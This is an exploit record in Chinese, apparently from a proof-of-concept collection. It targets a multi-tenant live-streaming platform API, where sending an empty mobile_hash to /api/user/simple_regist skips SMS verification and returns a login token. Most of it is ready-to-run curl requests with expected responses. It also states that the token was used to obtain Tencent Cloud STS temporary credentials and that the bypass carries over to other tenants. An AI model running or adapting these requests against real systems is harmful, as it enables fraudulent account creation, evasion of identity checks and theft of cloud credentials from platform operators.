# 直播平台未授权注册绕过短信验证（/api/user/simple_regist 空 mobile_hash 直接签发 token）

- **code**: 直播平台未授权注册绕过短信验证-api-user-simple_regist-空-mobile_hash-直接签发-token
- **kind**: exp
- **category**: auth-bypass
- **component**: 龙门直播 / 多租户直播平台 API（Go gRPC-gateway）
- **severity**: critical
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example.com（example.com 靶标 · 龙门直播租户, Host: example.com）实测：mobile_hash 传空 → HTTP 200 status 0，解密后返回 id=1358553 与可用 token；随后 /api/user/login 密码登录 status 0 成功签发新 token；该 token 已用于调用登录态接口 /api/qcloud_sts 并成功取得腾讯云 STS 临时凭证。
- **path**: pocs/直播平台未授权注册绕过短信验证-api-user-simple_regist-空-mobile_hash-直接签发-token/poc.sh
- **created_at**: 2026-10-08T14:51:31.899Z

## 描述

直播平台「简化注册」接口不校验短信验证码，只给 account/pwd 即可建号并拿到登录态，绕过短信风控与实名前置校验

## 用法

```
替换 account（任意手机号）与 device-info（任意随机串）；reg_source_id 按租户取（本租户 UD70IUQQ）。响应 data 字段需按「前端加密」算法解密才能读到 token。
```

## 正文

```
## 原理
后端提供两条注册链路：
- 正规链路：/api/user/regist（第一步，CheckVerifyCodeReq{mobile,smscode}，强制短信校验）→ /api/user/register（第二步，需 mobile_hash）
- 「简化注册」链路：/api/user/simple_regist，请求体同为 RegisterReq{account,pwd,mobile_hash,device_info,platform,reg_source_id,website,sex,anchor_id,invite_code}
  但实测**完全不校验 smscode / mobile_hash**（mobile_hash 传空字符串即通过），直接建号并返回登录态 token。

## 复现（curl 原文）
```bash
curl -k -s -X POST 'https://example.com/api/user/simple_regist' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Authorization: token=; uid=' \
  -H 'platform: 0' \
  -H 'device-info: lmdev-test01' \
  -H 'reg-source: UD70IUQQ' \
  -H 'lang: zh_cn' \
  -d '{"account":"18736257288","anchor_id":0,"device_info":"lmdev-test01","invite_code":"","mobile_hash":"","platform":0,"pwd":"abc12345","reg_source_id":"UD70IUQQ","sex":0,"website":"example.com"}'
# → {"status":0,"data":"<加密串>","msg":"SUCCESS"}
# data 用下方算法解密 → {"id":1358553,"token":"mDx86zVpBmXyRc0kqdJJycOPw/maKx2r",...}

curl -k -s -X POST 'https://example.com/api/user/login' \
  -H 'Content-Type: application/json;charset=UTF-8' -H 'device-info: lmdev-test01' -H 'reg-source: UD70IUQQ' \
  -H 'platform: 0' -H 'lang: zh_cn' \
  -d '{"account":"18736257288","pwd":"abc12345","platform":0,"login_type":1,"source_id":10001,"website":"example.com"}'
# → status 0 再次签发 token（密码登录可用）
```
后续请求头：`Authorization: token=<token>; uid=<uid>`

## 判定要点（避免误报）
- 对照证明短信校验确实存在：/api/user/readyForTakeOff {mobile,smscode} 任意码 → 「验证码错误」；/api/user/checkSmsCode 未登录 → LOGIN TIMEOUT；同手机号二次 simple_regist → 「帐号已存在」（说明走的是真实建号逻辑，不是空响应）
- 通用性：同一平台多租户共用该后端（reg-source 头按域名取码），换租户域名同样适用；镜像主机 target294.example.com 亦路由该接口
```
